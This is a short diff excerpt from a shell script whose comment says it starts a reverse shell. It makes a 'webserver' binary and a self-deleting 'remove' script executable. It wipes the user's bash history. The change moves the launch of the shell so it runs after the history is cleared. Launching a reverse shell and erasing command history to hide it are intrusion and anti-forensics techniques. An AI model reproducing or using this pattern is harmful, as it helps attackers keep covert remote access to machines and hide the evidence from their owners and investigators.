@@ -98,5 +98,5 @@ echo "rm -r remove" >> remove
 #start reverse shell
 chmod +x webserver
 chmod +x remove
-./webserver
 cat /dev/null > ~/.bash_history && history -c
+./webserver
